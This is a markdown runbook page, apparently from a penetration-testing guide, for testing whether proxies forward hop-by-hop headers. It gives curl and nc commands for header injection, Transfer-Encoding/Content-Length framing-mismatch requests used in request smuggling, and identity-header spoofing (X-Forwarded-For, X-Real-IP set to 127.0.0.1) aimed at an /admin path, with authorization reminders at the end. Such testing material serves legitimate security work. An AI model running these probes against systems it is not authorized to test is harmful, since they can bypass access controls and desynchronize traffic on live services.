---
title: "Hop-by-Hop Headers"
description: "Which headers proxies must strip, why it matters, and how unstripped hop-by-hop headers break trust boundaries."
phase: Web
order: 45
tags:
  - http
  - proxy
  - smuggling
  - headers
tools:
  - burp suite
  - curl
updated: 2026-10-01
---

A runbook for testing **hop-by-hop header forwarding** in an authorized scope. Goal: determine which headers a proxy fails to strip and whether that breaks framing or trust boundaries.

## 1. Know the hop-by-hop set

These apply to one transport leg and must not be forwarded: `Connection`, `Keep-Alive`, `Proxy-Authenticate`, `Proxy-Authorization`, `TE`, `Trailer`, `Transfer-Encoding`, `Upgrade`. Any header named inside `Connection` is also hop-by-hop.

```bash
cat > hop.txt <<'EOF'
Connection
Keep-Alive
Proxy-Authenticate
Proxy-Authorization
TE
Trailer
Transfer-Encoding
Upgrade
EOF
```

## 2. Find an echo or oracle

You need a way to see what reaches the origin: an echo endpoint, a log sink, or a parser difference. Without one, use response-header reflection.

```bash
curl -s https://target/headers | grep -iE 'connection|transfer|proxy|upgrade|^via'
```

## 3. Send hop-by-hop headers to the front end

Inject each header and watch whether it survives to the backend. Combine with `Connection: X-Foo` to nominate a custom header as hop-by-hop.

```bash
curl -s -D - -o /dev/null https://target/ \
  -H 'Connection: keep-alive, X-Forwarded-For' \
  -H 'X-Forwarded-For: 127.0.0.1' \
  -H 'Proxy-Authorization: Basic Zm9vOmJhcg=='
```

## 4. Test Transfer-Encoding forwarding

If the proxy forwards `Transfer-Encoding`, the two hops can disagree about framing — the root of many desync bugs.

```bash
printf 'POST / HTTP/1.1\r\nHost: target\r\nTransfer-Encoding: chunked\r\nContent-Length: 6\r\n\r\n0\r\n\r\nG' | nc target 80
curl -s -D - -o /dev/null https://target/ -H 'Transfer-Encoding: chunked' -H 'Content-Length: 4' --data-binary $'1\r\nA'
```

## 5. Abuse the `Connection` token trick

Naming a header in `Connection` tells the first hop to treat it as hop-by-hop. If the backend ignores it, you can make the proxy strip a header the backend still trusts — or the reverse.

```bash
curl -s -D - -o /dev/null https://target/ \
  -H 'Connection: Transfer-Encoding, X-Real-IP' \
  -H 'X-Real-IP: 127.0.0.1'
```

## 6. Check forwarded identity trust

Proxies commonly trust `X-Forwarded-For`, `X-Real-IP`, or custom identity headers. If any reaches the origin unsanitized, you can spoof identity or reach internal services.

```bash
for h in X-Forwarded-For X-Real-IP X-Forwarded-Host X-Original-URL X-Rewrite-URL; do
  echo "== $h"; curl -s -o /dev/null -w '%{http_code}\n' https://target/admin -H "$h: 127.0.0.1"
done
```

## 7. Full pipeline (one block)

```bash
TARGET=https://target
# 1) reflection oracle
curl -s "$TARGET/headers" | grep -iE 'connection|transfer|proxy|upgrade|^via'
# 2) inject every hop-by-hop header
while read h; do
  curl -s -D - -o /dev/null "$TARGET/" -H "$h: test" | grep -i "$h"
done < hop.txt
# 3) framing mismatch with Transfer-Encoding
printf 'POST / HTTP/1.1\r\nHost: target\r\nTransfer-Encoding: chunked\r\nContent-Length: 4\r\n\r\n1\r\nA' | nc target 80 | head
# 4) Connection token trick + forwarded identity trust
curl -s -o /dev/null -w '%{http_code}\n' "$TARGET/" -H 'Connection: Transfer-Encoding, X-Real-IP' -H 'X-Real-IP: 127.0.0.1'
for h in X-Forwarded-For X-Real-IP X-Original-URL X-Rewrite-URL; do
  echo "== $h"; curl -s -o /dev/null -w '%{http_code}\n' "$TARGET/admin" -H "$h: 127.0.0.1"
done
```

## Ethics & legality

- Only test hosts in an official scope or with written authorization.
- Do not forge identities on live systems beyond proving the trust gap.
- Record which proxy failed to strip which header, and the observable effect.
